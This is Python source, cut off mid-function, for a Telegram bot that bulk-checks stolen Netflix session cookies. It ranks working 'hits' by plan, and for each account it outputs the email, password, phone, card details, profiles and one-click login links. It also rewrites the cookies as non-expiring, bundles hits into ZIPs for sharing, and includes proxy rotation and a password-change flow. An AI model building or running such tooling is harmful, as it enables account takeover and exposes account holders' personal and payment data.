#!/usr/bin/env python3
"""Netflix Cookie Checker — Telegram Bot"""

import os
import io
import time
import random
import asyncio
import logging
import tempfile
import zipfile
import json
import re
import functools
from datetime import date
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

from checker import check_cookie
import stats as stats_tracker
from dashboard import start_dashboard
import mongodb_store

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.WARNING,
)
for _noisy in ("httpx", "telegram", "apscheduler", "httpcore"):
    logging.getLogger(_noisy).setLevel(logging.ERROR)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")

# ── Admin ID — set ADMIN_ID env var, or first user to /setadmin becomes admin ──
_ADMIN_ID_FILE = Path("admin_id.txt")

def _load_admin_id() -> int | None:
    _env = os.environ.get("ADMIN_ID", "").strip()
    if _env.isdigit():
        return int(_env)
    if _ADMIN_ID_FILE.exists():
        try:
            return int(_ADMIN_ID_FILE.read_text().strip())
        except Exception:
            pass
    return None

def _save_admin_id(uid: int) -> None:
    _ADMIN_ID_FILE.write_text(str(uid))

_ADMIN_ID: int | None = _load_admin_id()


def is_admin(uid: int) -> bool:
    return _ADMIN_ID is not None and uid == _ADMIN_ID


# ── Proxy add/import flows ────────────────────────────────────────────────────
_PROXY_ADD_STATE: set[int] = set()     # admin is typing a single proxy line
_PROXY_SOURCE_STATE: set[int] = set()  # admin is typing a source URL to import from

_EXECUTOR = ThreadPoolExecutor(max_workers=16)

COOKIE_EXTENSIONS = (".txt", ".json", ".cookie", ".cookies")
COOKIE_MIME_TYPES = {
    "text/plain", "application/json", "text/json",
    "application/octet-stream", "text/csv",
}

# Keep concurrency moderate — too many parallel requests to Netflix triggers
# IP-level rate limiting (429) and causes valid cookies to show as errors.
BULK_CONCURRENCY = 16

_CANCEL_SESSIONS: set[int] = set()
# Maps uid → epoch timestamp when the session started.
# The watchdog auto-clears sessions stuck longer than SESSION_TIMEOUT_SEC.
_ACTIVE_USERS: dict[int, float] = {}
SESSION_TIMEOUT_SEC = 15 * 60  # 15 minutes
# Maps uid → session_id (status_msg.message_id) for the *currently running* check.
# This is what /cancel uses — _HITS_STORE is only populated after a check finishes.
_USER_SESSION: dict[int, int] = {}

# Bot's own Telegram username — set on startup, used as watermark in hit files.
_BOT_USERNAME: str = ""

# Per-user output mode: "full" or "basic"  (default: "basic")
_USER_MODE: dict[int, str] = {}

# Per-user delivery mode: "zip" (default) or "cards" (send each hit as individual card)
_USER_DELIVERY: dict[int, str] = {}

# ── Beta: Change Password flow ─────────────────────────────────────────────
# Maps uid → state dict with keys: step, netflix_id, old_pw, new_pw
_CHANGEPW_STATE: dict[int, dict] = {}

# Temporary store for bulk hits — keyed by session_id (status msg id)
# Holds (hits_list, user_id) so the callback can send cards to the right chat
_HITS_STORE: dict[int, tuple[list, int]] = {}

# Navigation store for paginated login links — keyed by "{session_id}:{link_type}"
_NAV_STORE: dict[str, dict] = {}

# Single-check on-demand NFToken store — keyed by str(session_id).
# Populated when NFToken misses its 1.5s grace window during a single check.
# Purged by the watchdog after _STORE_TTL seconds.
_GEN_LINK_STORE: dict[str, dict] = {}


# ---------------------------------------------------------------------------
# Netflix-only validation helpers
# ---------------------------------------------------------------------------

# Services whose cookies are commonly confused with Netflix
_OTHER_SERVICES: dict[str, str] = {
    "accounts.google.com":  "Google",
    "google.com":           "Google",
    ".amazon.com":          "Amazon",
    "amazon.co":            "Amazon",
    "spotify.com":          "Spotify",
    ".facebook.com":        "Facebook",
    "instagram.com":        "Instagram",
    "youtube.com":          "YouTube",
    "disneyplus.com":       "Disney+",
    ".hulu.com":            "Hulu",
    "hbomax.com":           "HBO Max",
    "max.com":              "Max",
    "primevideo.com":       "Prime Video",
    ".apple.com":           "Apple",
    ".microsoft.com":       "Microsoft",
    "twitter.com":          "Twitter/X",
    "x.com":                "Twitter/X",
    "linkedin.com":         "LinkedIn",
    "twitch.tv":            "Twitch",
    "crunchyroll.com":      "Crunchyroll",
    "hotstar.com":          "Hotstar",
}

# Binary / non-text signatures (magic bytes as hex prefixes)
_BINARY_MAGIC: list[bytes] = [
    b'\xff\xd8\xff',        # JPEG
    b'\x89PNG',             # PNG
    b'GIF8',                # GIF
    b'%PDF',                # PDF
    b'PK\x03\x04',         # ZIP (handled separately)
    b'\x1f\x8b',            # GZIP
    b'MZ',                  # EXE / DLL
    b'\x7fELF',             # ELF binary
    b'BM',                  # BMP
    b'ID3',                 # MP3
    b'\x00\x00\x00',        # various binary formats
]

_NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")


def _has_netflix_markers(text: str) -> bool:
    """Return True if text contains at least one Netflix cookie identifier."""
    return any(m in text for m in _NETFLIX_MARKERS)


def _wrong_service_name(text: str) -> str | None:
    """
    Return the name of the non-Netflix service if the cookie clearly belongs
    to another platform, else None.
    """
    tl = text.lower()
    for domain, name in _OTHER_SERVICES.items():
        if domain in tl:
            return name
    return None


def _is_binary_content(raw: bytes) -> bool:
    """True if the first bytes look like a binary/image/archive file."""
    for magic in _BINARY_MAGIC:
        if raw.startswith(magic):
            return True
    # High ratio of non-printable bytes also indicates binary
    sample = raw[:512]
    non_print = sum(1 for b in sample if b < 9 or (13 < b < 32 and b != 10))
    return len(sample) > 0 and non_print / len(sample) > 0.15


def _validate_cookie_text(text: str) -> tuple[bool, str]:
    """
    Validate that text looks like Netflix cookie data.
    Returns (is_valid, error_message).
    """
    if not text or len(text.strip()) < 10:
        return False, "File is empty or too short."

    wrong = _wrong_service_name(text)
    if wrong and not _has_netflix_markers(text):
        return False, (
            f"This looks like a <b>{wrong}</b> cookie, not Netflix.\n"
            f"Only Netflix cookies (<code>NetflixId</code>, <code>SecureNetflixId</code>) are supported."
        )

    if not _has_netflix_markers(text):
        # Give a specific hint about what's missing
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        sample = lines[0][:80] if lines else text[:80]
        return False, (
            "❌ <b>No Netflix cookies found.</b>\n\n"
            "Required: <code>NetflixId</code> or <code>SecureNetflixId</code> cookie.\n\n"
            f"<i>File starts with:</i> <code>{sample}</code>"
        )

    return True, ""


def _get_mode(user_id: int) -> str:
    return _USER_MODE.get(user_id, "basic")


def _toggle_mode(user_id: int) -> str:
    current = _get_mode(user_id)
    new = "basic" if current == "full" else "full"
    _USER_MODE[user_id] = new
    return new


def _get_delivery(user_id: int) -> str:
    return _USER_DELIVERY.get(user_id, "zip")


def _set_delivery(user_id: int, mode: str) -> None:
    _USER_DELIVERY[user_id] = mode


# ── Settings panel helpers — shared by /settings, setmode, setdelivery ────

def _settings_text(uid: int) -> str:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    mode_lbl = "📋 Full Info" if mode == "full" else "📄 Basic"
    dlv_lbl  = "💬 Card-by-Card" if delivery == "cards" else "📦 ZIP (default)"
    return (
        "⚙️ <b>Bot Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>Output Format:</b>  {mode_lbl}\n"
        f"  <i>How each account card is displayed</i>\n\n"
        f"📤 <b>Delivery Mode:</b>  {dlv_lbl}\n"
        f"  <i>How bulk hits are sent to you</i>\n\n"
        "  📦 <b>ZIP mode</b> — all hits bundled in one ZIP file\n"
        "        with full details, cookies &amp; login links\n"
        "  💬 <b>Card-by-Card</b> — each hit sent as a separate\n"
        "        message card with login buttons\n\n"
        "Tap a button below to change your preferences:"
    )


def _settings_markup(uid: int) -> InlineKeyboardMarkup:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                "✅ Full Info" if mode == "full" else "📋 Full Info",
                callback_data=f"setmode:{uid}:full",
            ),
            InlineKeyboardButton(
                "✅ Basic" if mode == "basic" else "📄 Basic",
                callback_data=f"setmode:{uid}:basic",
            ),
        ],
        [
            InlineKeyboardButton(
                "✅ ZIP Mode" if delivery == "zip" else "📦 ZIP Mode",
                callback_data=f"setdelivery:{uid}:zip",
            ),
            InlineKeyboardButton(
                "✅ Card-by-Card" if delivery == "cards" else "💬 Card-by-Card",
                callback_data=f"setdelivery:{uid}:cards",
            ),
        ],
        [
            InlineKeyboardButton("❌ Close", callback_data="closesettings"),
        ],
    ])


def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 Cancel", callback_data=f"cancel:{msg_id}")
    ]])


def _login_keyboard(result: dict) -> InlineKeyboardMarkup | None:
    """Login buttons only — no mode toggle in result messages."""
    nft = result.get("nftoken")
    if nft and nft.get("success"):
        return InlineKeyboardMarkup([[
            InlineKeyboardButton("🖥️ PC Login",    url=nft["pc_url"]),
            InlineKeyboardButton("📱 Phone Login", url=nft["mobile_url"]),
        ]])
    return None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _flag(country: str) -> str:
    country = (country or "").strip()
    for ch in country:
        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
            return ""
    code = country.upper()
    if len(code) == 2 and code.isalpha():
        return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))
    NAME_MAP = {
        "india": "IN", "poland": "PL", "portugal": "PT",
        "united states": "US", "usa": "US", "uk": "GB",
        "united kingdom": "GB", "germany": "DE", "france": "FR",
        "italy": "IT", "spain": "ES", "brazil": "BR", "mexico": "MX",
        "canada": "CA", "australia": "AU", "netherlands": "NL",
        "turkey": "TR", "russia": "RU", "japan": "JP",
        "south korea": "KR", "indonesia": "ID", "thailand": "TH",
        "vietnam": "VN", "pakistan": "PK", "bangladesh": "BD",
        "argentina": "AR", "colombia": "CO", "chile": "CL",
        "romania": "RO", "ukraine": "UA", "sweden": "SE",
        "norway": "NO", "denmark": "DK", "finland": "FI",
        "czech": "CZ", "hungary": "HU", "slovakia": "SK",
        "croatia": "HR", "serbia": "RS", "bulgaria": "BG",
        "greece": "GR", "israel": "IL", "saudi arabia": "SA",
        "uae": "AE", "egypt": "EG", "nigeria": "NG",
        "south africa": "ZA", "kenya": "KE",
    }
    code2 = NAME_MAP.get(country.lower())
    if code2:
        return chr(0x1F1E6 + ord(code2[0]) - ord("A")) + chr(0x1F1E6 + ord(code2[1]) - ord("A"))
    return ""


def _country_display(country: str) -> str:
    flag = _flag(country)
    if flag:
        return f"{country} {flag}"
    return country


def make_progress_bar(done: int, total: int, width: int = 20) -> str:
    if total == 0:
        return f"[{'░' * width}] 0%"
    filled = int(width * done / total)
    bar = "▓" * filled + "░" * (width - filled)
    pct = int(100 * done / total)
    return f"[{bar}] {pct}%"


def _yes_no(val) -> str:
    if val is None:
        return "Unknown"
    return "Yes" if val else "No"


# ---------------------------------------------------------------------------
# Message formatters — Full Mode and Basic Mode
# ---------------------------------------------------------------------------

def _plan_title(plan_name: str, status: str) -> str:
    p = (plan_name or "").lower()
    if status == "free":
        return "🔓 FREE ACCOUNT (No Subscription) 🔓"
    if status == "on_hold":
        return "⏸️ ON HOLD ACCOUNT ⏸️"
    if "premium" in p:
        return "🌟 PREMIUM ACCOUNT 🌟"
    if "standard" in p and "ads" in p:
        return "📺 STANDARD W/ ADS ACCOUNT 📺"
    if "standard" in p:
        return "⭐ STANDARD ACCOUNT ⭐"
    if "basic" in p or "base" in p:
        return "📱 BASIC ACCOUNT 📱"
    if "mobile" in p:
        return "📱 MOBILE ACCOUNT 📱"
    if status == "hit":
        return "✅ VALID ACCOUNT ✅"
    return "❌ INVALID ACCOUNT ❌"


def _status_line(status: str, plan: str) -> str:
    p_lower = (plan or "").lower()
    if status == "hit":
        if "premium" in p_lower:
            return "✅ Status: Valid — Premium 4K Account"
        if "standard" in p_lower and "ads" in p_lower:
            return "✅ Status: Valid — Standard with Ads"
        if "standard" in p_lower:
            return "✅ Status: Valid — Standard Account"
        if "basic" in p_lower:
            return "✅ Status: Valid — Basic Account"
        if "mobile" in p_lower:
            return "✅ Status: Valid — Mobile Account"
        return "✅ Status: Valid Account"
    if status == "free":
        return "🔓 Status: Valid — No Active Subscription"
    if status == "on_hold":
        return "⏸️ Status: On Hold — Payment Issue"
    return "✅ Status: Valid"


def _build_card_line(result: dict) -> str:
    ct = result.get("card_type") or ""
    l4 = result.get("card_last4") or ""
    exp = result.get("card_expiry") or ""
    expired = result.get("card_expired", False)
    partner = result.get("partner_name") or ""
    is_third = result.get("is_third_party", False)

    if is_third and partner:
        return f"{partner} (3rd party billing)"
    if ct:
        parts = [ct.upper() if len(ct) <= 10 else ct]
        if l4:
            parts.append(f"···· {l4}")
        if exp:
            flag = " ⚠️EXPIRED" if expired else ""
            parts.append(f"(exp {exp}{flag})")
        return " ".join(parts)
    return result.get("payment") or "Unknown"


def format_result_full(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Full info mode — all fields shown, matches reference screenshot."""
    status  = result.get("status", "error")
    plan    = result.get("plan_name")   or ""
    email   = result.get("email")       or "Hidden"
    name    = result.get("name")        or ""
    password= result.get("password")    or ""
    phone   = result.get("phone")       or ""
    country = result.get("country")     or "Unknown"
    quality = result.get("quality")     or "Unknown"
    streams = result.get("max_streams") or "Unknown"
    price   = result.get("price")       or "Unknown"
    since   = result.get("member_since") or "Unknown"
    billing = result.get("next_billing") or "Unknown"
    payment = result.get("payment")     or "Unknown"
    nf_id   = result.get("netflix_id")  or ""
    nf_sec  = result.get("secure_netflix_id") or ""
    nf_vid  = result.get("nfvdid")      or ""
    ms_status = result.get("membership_status") or "Unknown"
    profile_names = result.get("profile_names") or []
    profiles_count = result.get("profiles")
    is_on_hold = result.get("is_on_hold", False)
    num_extra = result.get("num_extra_members", 0)
    email_verified = result.get("email_verified")
    is_free_trial = result.get("is_in_free_trial", False)

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)

    title = _plan_title(plan, status)
    if total > 1:
        title += f"\n📊 Account #{index} of {total}"

    lines = [f"<b>{title}</b>", ""]

    if source:
        lines.append(f"📁 Source: {source}")

    lines.append(_status_line(status, plan))
    lines.append("")
    lines.append("👤 <b>Account Details:</b>")

    if name:
        lines.append(f"• Name: {name}")
    lines.append(f"• Email: <code>{email}</code>")
    if password:
        lines.append(f"• Password: <code>{password}</code>")
    lines.append(f"• Country: {_country_display(country)}")
    lines.append(f"• Plan: {plan or 'Unknown'}")
    lines.append(f"• Price: {price}")
    lines.append(f"• Member Since: {since}")
    lines.append(f"• Next Billing: {billing}")
    lines.append(f"• Payment: {payment}")
    if card_line and card_line != payment:
        lines.append(f"• Card: {card_line}")
    if phone:
        lines.append(f"• Phone: <code>{phone}</code> (Yes)")
    else:
        lines.append(f"• Phone: N/A")
    lines.append(f"• Quality: {quality}")
    lines.append(f"• Streams: {streams}")
    lines.append(f"• Hold Status: {'Yes' if (status == 'on_hold' or is_on_hold) else 'No'}")

    # Extra member
    has_extra = num_extra > 0 if isinstance(num_extra, int) else False
    extra_slot = str(num_extra) if has_extra else "N/A"
    lines.append(f"• Extra Member: {'Yes' if has_extra else 'No'}")
    lines.append(f"• Extra Member Slot: {extra_slot}")

    lines.append(f"• Email Verified: {_yes_no(email_verified)}")
    lines.append(f"• Free Trial: {'Yes' if is_free_trial else 'No'}")
    lines.append(f"• Membership Status: {ms_status}")

    # Profiles — use accurate count from __ref array, names where available
    prof_count = result.get("profile_count") or (
        profiles_count if isinstance(profiles_count, int) else
        (len(profile_names) if profile_names else 0)
    )
    lines.append(f"• Connected Profiles: {prof_count if prof_count else 'Unknown'}")
    if profile_names:
        lines.append(f"• Profile Names: {', '.join(profile_names)}")
        if isinstance(prof_count, int) and prof_count > len(profile_names):
            lines.append(f"  <i>(+{prof_count - len(profile_names)} more — names not shown by Netflix on this page)</i>")

    # ── Account warnings ──────────────────────────────────────────────────
    issues = result.get("account_issues") or []
    if issues:
        lines.append("")
        lines.append("⚠️ <b>Account Alerts:</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")

    lines.append("")
    if nf_id:
        lines.append("🍪 <b>Cookie:</b>")
        lines.append(f"<code>NetflixId={nf_id}</code>")
        lines.append("")

    nft = result.get("nftoken")
    if nft and not nft.get("success"):
        lines.append(f"⚠️ <i>Login links: {nft.get('error', 'unavailable')}</i>")

    return "\n".join(lines)


def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Basic mode — clean, structured card with clear sections."""
    status   = result.get("status", "error")
    plan     = result.get("plan_name")    or ""
    email    = result.get("email")        or "Hidden"
    name     = result.get("name")         or ""
    country  = result.get("country")      or "Unknown"
    quality  = result.get("quality")      or "Unknown"
    streams  = result.get("max_streams")  or "?"
    price    = result.get("price")        or "Unknown"
    billing  = result.get("next_billing") or "Unknown"
    nf_id    = result.get("netflix_id")   or ""
    phone    = result.get("phone")        or ""
    password = result.get("password")     or ""
    issues   = result.get("account_issues") or []
    nft      = result.get("nftoken")

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)

    # ── Title ──────────────────────────────────────────────────────────────
    title = _plan_title(plan, status)
    counter = f"  <i>#{index} of {total}</i>" if total > 1 else ""
    lines = [f"<b>{title}</b>{counter}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", ""]

    # ── Status ─────────────────────────────────────────────────────────────
    lines.append(_status_line(status, plan))
    lines.append("")

    # ── Identity ───────────────────────────────────────────────────────────
    lines.append("👤 <b>Account</b>")
    if name:
        lines.append(f"  • Name:     {name}")
    lines.append(f"  • Email:    <code>{email}</code>")
    if password:
        lines.append(f"  • Password: <code>{password}</code>")
    if phone:
        lines.append(f"  • Phone:    {phone}")
    lines.append("")

    # ── Subscription ───────────────────────────────────────────────────────
    flag = _flag(country)
    country_disp = f"{country} {flag}".strip() if flag else country
    lines.append("📋 <b>Subscription</b>")
    lines.append(f"  • Country:  {country_disp}")
    lines.append(f"  • Plan:     {plan or 'Unknown'}")
    lines.append(f"  • Quality:  {quality}  ·  {streams} screens")
    lines.append(f"  • Price:    {price}")
    lines.append(f"  • Billing:  {billing}")
    if card_line and card_line not in ("Unknown", ""):
        lines.append(f"  • Payment:  {card_line}")
    lines.append("")

    # ── Cookie ─────────────────────────────────────────────────────────────
    if nf_id:
        lines.append(f"🍪 <code>NetflixId={nf_id}</code>")
        lines.append("")

    # ── Warnings ───────────────────────────────────────────────────────────
    if issues:
        lines.append("⚠️ <b>Account Issues</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")
        lines.append("")

    # ── Login note ─────────────────────────────────────────────────────────
    if nft and not nft.get("success"):
        lines.append(f"<i>⚠️ Login links unavailable: {nft.get('error', 'unknown error')}</i>")

    # trim trailing blank lines
    while lines and lines[-1] == "":
        lines.pop()

    return "\n".join(lines)


def format_error_card(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Styled card for error / invalid accounts — shows source + reason."""
    status  = result.get("status", "error")
    message = result.get("message") or ""
    nf_id   = result.get("netflix_id") or ""

    counter = f"  #{index}/{total}" if total > 1 else ""

    if status == "invalid":
        header = f"❌ <b>INVALID / EXPIRED{counter}</b>"
        reason = message or "Cookie is expired or invalid."
        icon   = "❌"
    else:
        header = f"⚠️ <b>ERROR{counter}</b>"
        reason = message or "Unknown error."
        icon   = "⚠️"

    lines = [header, ""]
    if source:
        lines.append(f"📁 Source: {source}")
    lines.append(f"{icon} Reason: <i>{reason}</i>")
    if nf_id:
        snippet = nf_id[:40] + "…" if len(nf_id) > 40 else nf_id
        lines.append(f"🍪 Cookie: <code>NetflixId={snippet}</code>")

    return "\n".join(lines)


def format_result(result: dict, index: int = 1, total: int = 1, source: str = "", user_id: int = 0) -> str:
    try:
        status = result.get("status", "error")
        if status in ("error", "invalid"):
            return format_error_card(result, index, total, source)
        mode = _get_mode(user_id) if user_id else "basic"
        if mode == "basic":
            return format_result_basic(result, index, total, source)
        return format_result_full(result, index, total, source)
    except Exception as e:
        logger.exception("format_result crashed for status=%s", result.get("status"))
        return (
            f"⚠️ <b>Display error</b> — could not render account card.\n"
            f"<i>{type(e).__name__}: {e}</i>\n\n"
            f"Account #{index} of {total}"
        )


# ---------------------------------------------------------------------------
# Cookie splitting
# ---------------------------------------------------------------------------

_HIT_BLOCK_COOKIE_RE = re.compile(r'[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*\S{20,}')
# Matches separator lines: ──────────────── or ════════ or --------- (8+ chars)
_HIT_SEPARATOR_RE  = re.compile(r'(?m)^[\u2500\u2550\-=─═]{8,}\s*$')


def split_cookies_from_text(text: str) -> list[str]:
    try:
        from checker import universal_extract_accounts
        text = text.strip()
        if not text:
            return []

        if text.startswith("[["):
            try:
                outer = json.loads(text)
                if isinstance(outer, list) and all(isinstance(i, list) for i in outer):
                    return [json.dumps(inner) for inner in outer]
            except Exception:
                pass

        if text.startswith("[") or text.startswith("{"):
            return [text]

        # ── Hit-file format detection ──────────────────────────────────────────
        if _HIT_BLOCK_COOKIE_RE.search(text) and _HIT_SEPARATOR_RE.search(text):
            parts = _HIT_SEPARATOR_RE.split(text)
            valid = []
            for part in parts:
                part = part.strip()
                if part and _HIT_BLOCK_COOKIE_RE.search(part):
                    valid.append(part)
            if valid:
                return valid
        # ── Standard formats (Netscape, JSON, combo, NetflixId-anchored) ──────
        try:
            blocks = universal_extract_accounts(text)
        except Exception:
            blocks = []
        if blocks:
            return blocks

        return [text]
    except Exception:
        return [text] if text.strip() else []


# ---------------------------------------------------------------------------
# ZIP extractor (input)
# ---------------------------------------------------------------------------

_ZIP_ENTRY_LIMIT = 2000   # max files read from a single ZIP

def read_cookie_texts_from_zip(zip_path: str) -> list[tuple[str, str]]:
    """
    Extract cookie text files from a ZIP.
    Handles: corrupt ZIPs, password-protected ZIPs, huge ZIPs (capped at
    _ZIP_ENTRY_LIMIT entries), binary-only ZIPs, and individual bad entries.
    Raises BadZipFile for fundamentally corrupt archives so the caller
    can give the user a specific error message.
    """
    results = []
    read_count = 0
    with zipfile.ZipFile(zip_path, "r") as zf:
        for info in zf.infolist():
            if read_count >= _ZIP_ENTRY_LIMIT:
                break
            name = info.filename
            base = Path(name).name
            if not base or base.startswith("_") or base.startswith("."):
                continue
            ext = Path(name).suffix.lower()
            if ext not in COOKIE_EXTENSIONS:
                continue
            try:
                raw = zf.read(name)
                if _is_binary_content(raw):
                    continue
                text = raw.decode("utf-8", errors="replace").strip()
                if text:
                    results.append((base, text))
                    read_count += 1
            except Exception:
                continue
    return results


# ---------------------------------------------------------------------------
# Account quality scorer
# ---------------------------------------------------------------------------

def _score_account(result: dict) -> tuple:
    """
    Score an account for quality ranking. Higher tuple = better account.
    Criteria (priority order):
      1. Plan tier  (Premium > Standard > Basic > Mobile > unknown)
      2. No account issues
      3. Not on hold
      4. Days until next billing  (more = subscription lasts longer)
      5. Member age in days       (older = more established account)
    """
    from datetime import datetime, date as _date

    plan = (result.get("plan_name") or "").lower()
    if "premium" in plan:
        plan_score = 5
    elif "standard" in plan and "ads" not in plan:
        plan_score = 4
    elif "standard" in plan:
        plan_score = 3
    elif "basic" in plan or "base" in plan:
        plan_score = 2
    elif "mobile" in plan:
        plan_score = 1
    else:
        plan_score = 0

    no_issues = 0 if result.get("account_issues") else 1
    not_hold  = 0 if result.get("is_on_hold") else 1

    billing_days = 0
    billing_str = result.get("next_billing") or ""
    if billing_str and billing_str not in ("Unknown", ""):
        try:
            dt = datetime.strptime(billing_str, "%B %d, %Y")
            billing_days = max(0, (dt.date() - _date.today()).days)
        except Exception:
            pass

    member_days = 0
    since_str = result.get("member_since") or ""
    if since_str and since_str not in ("Unknown", ""):
        try:
            dt = datetime.strptime(since_str, "%B %d, %Y")
            member_days = (_date.today() - dt.date()).days
        except Exception:
            pass

    return (plan_score, no_issues, not_hold, billing_days, member_days)


# ---------------------------------------------------------------------------
# ZIP builder (hits output)
# ---------------------------------------------------------------------------

async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> None:
    """
    Build and send a single ZIP — Netflix-Hits-{date}-{N}x.zip
    Structure:
      Premium Hits/  — one .txt per premium account
      Normal Hits/   — one .txt per non-premium account
      _SUMMARY.txt   — totals overview
    Each account file is fully decorated with details + cookies + login link.
    Login links are generated for all accounts in parallel before building the ZIP.
    """
    from checker import generate_nftoken

    loop = asyncio.get_running_loop()
    today = date.today().isoformat()
    exp = "9999999999"

    # ── Deduplicate by NetflixId ───────────────────────────────────────────
    seen_ids: set[str] = set()
    deduped: list[tuple[dict, str, str]] = []
    for item in hits:
        nf_id = item[0].get("netflix_id") or ""
        if nf_id and nf_id in seen_ids:
            continue
        if nf_id:
            seen_ids.add(nf_id)
        deduped.append(item)

    dupes_removed = len(hits) - len(deduped)

    # ── Generate NFTokens for every hit in one parallel burst ─────────────
    async def _gen_token(result: dict) -> None:
        try:
            nf_id = result.get("netflix_id")
            if nf_id:
                nft = await loop.run_in_executor(
                    _EXECUTOR, generate_nftoken, {"NetflixId": nf_id}
                )
                result["nftoken"] = nft
        except Exception as _e:
            result["nftoken"] = {"success": False, "error": str(_e)}

    await asyncio.gather(*[_gen_token(r) for r, _, _ in deduped], return_exceptions=True)

    # ── Categorise ────────────────────────────────────────────────────────
    premium = [(r, s, w) for r, s, w in deduped
               if "premium" in (r.get("plan_name") or "").lower()]
    normal  = [(r, s, w) for r, s, w in deduped
               if "premium" not in (r.get("plan_name") or "").lower()]

    # ── Per-account decorated file builder ────────────────────────────────
    def _account_file(i: int, total: int, result: dict, source: str) -> str:
        email   = result.get("email")        or f"account_{i}"
        name    = result.get("name")         or ""
        pwd     = result.get("password")     or ""
        phone   = result.get("phone")        or ""
        country = result.get("country")      or "Unknown"
        plan    = result.get("plan_name")    or "Unknown"
        quality = result.get("quality")      or "Unknown"
        streams = result.get("max_streams")  or "?"
        price   = result.get("price")        or "Unknown"
        since   = result.get("member_since") or "Unknown"
        billing = result.get("next_billing") or "Unknown"
        payment = result.get("payment")      or "Unknown"
        ct      = result.get("card_type")    or ""
        cl4     = result.get("card_last4")   or ""
        cexp    = result.get("card_expiry")  or ""
        profiles= ", ".join(result.get("profile_names") or [])
        ev      = ("Yes"     if result.get("email_verified") is True
                   else "No" if result.get("email_verified") is False
                   else "Unknown")
        ms      = result.get("membership_status") or ""
        nf_id   = result.get("netflix_id")        or ""
        nf_sec  = result.get("secure_netflix_id") or ""
        nf_vid  = result.get("nfvdid")            or ""
        num_ex     = result.get("num_extra_members")  or 0
        status     = result.get("status")            or "hit"
        is_hold    = result.get("is_on_hold", False) or (status == "on_hold")
        free_trial = result.get("is_in_free_trial",  False)
        prof_count = result.get("profile_count")     or len(result.get("profile_names") or []) or 0
        flag       = _flag(country)
        nft        = result.get("nftoken")           or {}
        issues     = result.get("account_issues")    or []

        W = 66
        sep  = "═" * W
        thin = "─" * W

        def box_line(label: str, value: str) -> str:
            return f"  {label:<20} {value}"

        lines = [
            sep,
            f"  NETFLIX HIT  #{i}/{total}   —   {plan.upper()}",
            sep,
            "",
            f"  {'ACCOUNT DETAILS':^{W-2}}",
            thin,
        ]
        lines.append(box_line("Email:", email))
        if pwd:
            lines.append(box_line("Password:", pwd))
        if name:
            lines.append(box_line("Name:", name))
        if phone:
            lines.append(box_line("Phone:", phone))
        lines.append(box_line("Country:", f"{country} {flag}".strip()))
        lines.append(box_line("Status:", "On Hold ⏸" if status == "on_hold" else "Active ✅"))
        lines += [
            "",
            f"  {'SUBSCRIPTION':^{W-2}}",
            thin,
        ]
        lines.append(box_line("Plan:", plan))
        lines.append(box_line("Quality:", f"{quality}  ·  {streams} screen(s)"))
        lines.append(box_line("Price:", price))
        lines.append(box_line("Member Since:", since))
        lines.append(box_line("Next Billing:", billing))
        lines.append(box_line("Payment:", payment))
        if ct:
            card_str = ct
            if cl4:
                card_str += f" ···· {cl4}"
            if cexp:
                card_str += f"  (exp {cexp})"
            lines.append(box_line("Card:", card_str))
        lines.append(box_line("Hold Status:", "Yes ⏸" if is_hold else "No"))
        lines.append(box_line("Free Trial:", "Yes" if free_trial else "No"))
        lines.append(box_line("Extra Member:", f"Yes — {num_ex} slot(s)" if num_ex > 0 else "No"))
        lines.append(box_line("Email Verified:", ev))
        lines.append(box_line("Membership:", ms))
        lines.append(box_line("Profiles:", str(prof_count) if prof_count else "Unknown"))
        if profiles:
            lines.append(box_line("Profile Names:", profiles))
        lines.append(box_line("Source:", source))
        if issues:
            lines += ["", f"  {'ACCOUNT ALERTS':^{W-2}}", thin]
            for iss in issues:
                lines.append(f"  ⚠  {iss}")

        # Login links
        lines += ["", f"  {'LOGIN LINKS':^{W-2}}", thin]
        if nft.get("success"):
            lines.append(box_line("PC Login:", nft.get("pc_url", "")))
            lines.append(box_line("Mobile Login:", nft.get("mobile_url", "")))
            if nft.get("expires"):
                lines.append(box_line("Expires:", nft["expires"]))
        else:
            lines.append(box_line("Status:", f"Unavailable — {nft.get('error', 'token generation failed')}"))

        # Cookies
        lines += ["", f"  {'COOKIES  (Netscape HTTP Cookie File)':^{W-2}}", thin]
        if nf_id:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tNetflixId\t{nf_id}")
        if nf_sec:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tSecureNetflixId\t{nf_sec}")
        if nf_vid:
            lines.append(f"  .netflix.com\tTRUE\t/\tFALSE\t{exp}\tnfvdid\t{nf_vid}")

        # Watermark
